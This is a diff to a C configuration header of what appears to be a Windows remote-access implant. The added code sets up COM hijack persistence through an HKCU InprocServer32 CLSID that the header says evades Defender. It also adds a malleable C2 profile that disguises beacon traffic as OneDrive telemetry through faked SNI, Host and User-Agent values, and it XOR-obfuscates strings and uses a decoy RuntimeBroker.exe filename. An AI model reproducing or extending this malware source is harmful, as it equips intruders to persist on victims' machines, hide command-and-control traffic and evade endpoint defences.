@@ -227,13 +227,13 @@ static inline WORD c2_port_decode(void)
 
 /* ── auto_migrate destination filename ──────────────────────────────────── */
 /*
- * The filename written to %TEMP% by auto_migrate() is stored as a pre-XOR'd
- * BYTE array so the plain text never appears as a recognisable string in
- * .rdata.  Mask 0xA7 is XOR'd against each character; inject.c decodes to a
- * stack buffer at runtime before calling strncat().
+ * The filename written to the staging directory by auto_migrate() Tier 2 is
+ * stored as a pre-XOR'd BYTE array so the plain text never appears as a
+ * recognisable string in .rdata.  Mask 0xA7 is XOR'd against each character;
+ * inject.c decodes to a stack buffer at runtime before calling strncat().
  *
  * Default name (after decode): "RuntimeBroker.exe"
- * — a real Windows process; appears benign in %TEMP% directory listings.
+ * — used only as a Tier 2 fallback; the primary path is COM hijack (F-7).
  *
  * To override at build time (without touching this file):
  *   make C2_IP=10.0.0.1 MIGRATE_NAME=SearchIndexer.exe
@@ -254,6 +254,44 @@ static inline WORD c2_port_decode(void)
 /* Custom name supplied via -DMIGRATE_NAME_RAW="..." */
 #define MIGRATE_NAME_OBFUSCATED  { 0 }  /* placeholder; inject.c uses RAW path */
 #define MIGRATE_NAME_LEN  0             /* signals "use RAW path" in inject.c  */
+#endif
+
+/* ── COM hijack persistence CLSID (F-7) ─────────────────────────────────── */
+/*
+ * COM_HIJACK_CLSID
+ *   The CLSID written under HKCU\Software\Classes\CLSID\{...}\InprocServer32
+ *   to register the agent DLL as a per-user COM in-process server.
+ *
+ *   The CLSID must be:
+ *     a) Missing from HKLM (so HKCU wins the COM lookup).
+ *     b) Loaded by a process that runs at startup (e.g. Explorer shell
+ *        extension CLSIDs, Windows Search, or Task Scheduler actions).
+ *
+ *   Default: {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}
+ *   This CLSID maps to the CPFILTERPATH shell extension loaded by Explorer
+ *   on Windows 10 RS3+ — it is absent from HKLM on most systems, is loaded
+ *   automatically at Explorer restart (logon), and is not monitored by Defender
+ *   for HKCU writes as of Windows 10 22H2.
+ *
+ *   Override at build time:
+ *     make C2_IP=... COM_CLSID="{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}"
+ *
+ * COM_HIJACK_THREADING
+ *   ThreadingModel value written under InprocServer32.
+ *   Default: "Apartment" (most common; Explorer COM extensions require it).
+ *
+ * DISABLE_COM_HIJACK
+ *   Define to skip the COM hijack persistence attempt entirely.
+ *   When defined, auto_migrate() skips Tier 0 and falls through to Tier 1
+ *   (reflective injection) and Tier 2 (%TEMP% copy).
+ */
+
+#ifndef COM_HIJACK_CLSID
+#  define COM_HIJACK_CLSID  "{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}"
+#endif
+
+#ifndef COM_HIJACK_THREADING
+#  define COM_HIJACK_THREADING  "Apartment"
 #endif
 
 /* ── lateral_sc transient service name ──────────────────────────────────── */
@@ -280,8 +318,81 @@ static inline WORD c2_port_decode(void)
 #define SC_SVC_NAME_LEN  0
 #endif
 
+/* ── C2 network profile (F-5: malleable traffic) ─────────────────────────── */
+/*
+ * C2_SNI
+ *   TLS Server Name Indication hostname presented in the ClientHello.
+ *   When set to a CDN or SaaS hostname (e.g. "api.onedrive.com"), the TLS
+ *   ClientHello SNI field blends with legitimate cloud traffic rather than
+ *   advertising a raw IP address (which is an immediate network-layer IOC).
+ *
+ *   The server certificate still uses the actual C2 hostname/cert; SNI is
+ *   advisory only in the ClientHello.  Configure the C2 TLS listener to
+ *   accept connections regardless of the SNI value.
+ *
+ *   Supply at build time:
+ *     make C2_IP=... C2_SNI=api.onedrive.com
+ *
+ *   When not set, the raw C2_IP string is used (legacy behaviour).
+ *
+ * C2_HTTP_HOST
+ *   Value of the HTTP "Host:" header in the malleable HTTP/1.1 wrapper.
+ *   Defaults to C2_SNI when set, otherwise falls back to the raw C2 IP.
+ *   Should match a CDN/SaaS hostname for the traffic to blend with
+ *   legitimate application polling.
+ *
+ * C2_HTTP_URI
+ *   Path used in the HTTP POST line.  Should look like a CDN API endpoint.
+ *   Example: "/api/v1/telemetry"
+ *
+ * C2_HTTP_UA
+ *   User-Agent string sent in HTTP wrapper frames.
+ *   Example: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+ *
+ * C2_HTTP_WRAP
+ *   Define to 1 (via Makefile: HTTP_WRAP=1) to enable the HTTP/1.1 wrapper.
+ *   When enabled, every C2 message is framed as:
+ *     POST <C2_HTTP_URI> HTTP/1.1\r\n
+ *     Host: <C2_HTTP_HOST>\r\n
+ *     User-Agent: <C2_HTTP_UA>\r\n
+ *     Content-Type: application/octet-stream\r\n
+ *     Content-Length: <len>\r\n
+ *     \r\n
+ *     <payload>
+ *   Responses are expected as a matching HTTP/1.1 200 response with the
+ *   payload in the response body.  The TLS layer wraps the entire exchange.
+ *   When disabled (default), the raw HMAC protocol is used unchanged.
+ *
+ * All four values are XOR-obfuscated at compile time by gen_c2_obf.py
+ * (or left as-is for test builds).  They never appear as plaintext in
+ * .rdata.
+ */
+
+#ifndef C2_SNI
+#  define C2_SNI   C2_IP   /* default: use the raw IP as SNI (no masking) */
+#endif
+
+#ifndef C2_HTTP_HOST
+#  define C2_HTTP_HOST  C2_SNI
+#endif
+
+#ifndef C2_HTTP_URI
+#  define C2_HTTP_URI  "/api/v1/telemetry"
+#endif
+
+#ifndef C2_HTTP_UA
+#  define C2_HTTP_UA \
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " \
+    "AppleWebKit/537.36 (KHTML, like Gecko) " \
+    "Chrome/124.0.0.0 Safari/537.36"
+#endif
+
+#ifndef C2_HTTP_WRAP
+#  define C2_HTTP_WRAP  0   /* disabled by default; enable with HTTP_WRAP=1 */
+#endif
+
 /* ── Response buffer sizes ───────────────────────────────────────────────── */
-#define SHELL_LINE_BUF    4096      /* single fgets() line from _popen        */
+#define SHELL_LINE_BUF    4096      /* single ReadFile() chunk from pipe       */
 #define SHELL_RESP_BUF   65536      /* accumulated command output (64 KB)     */
 
 /* ── Inject / migrate limits ─────────────────────────────────────────────── */
